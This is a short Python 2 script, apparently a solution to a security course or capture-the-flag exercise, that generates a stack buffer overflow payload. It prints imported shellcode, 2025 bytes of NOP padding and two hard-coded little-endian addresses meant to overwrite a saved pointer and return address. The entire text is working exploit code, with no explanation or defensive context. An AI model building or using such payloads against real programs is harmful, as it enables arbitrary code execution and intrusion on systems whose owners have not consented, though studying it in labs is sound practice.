#!/usr/bin/python

from shellcode import shellcode 
from struct import pack
print shellcode + "\x90"*2025+ pack("<I", 0xbffed3a8) + pack("<I", 0xbffedbbc)
#2033

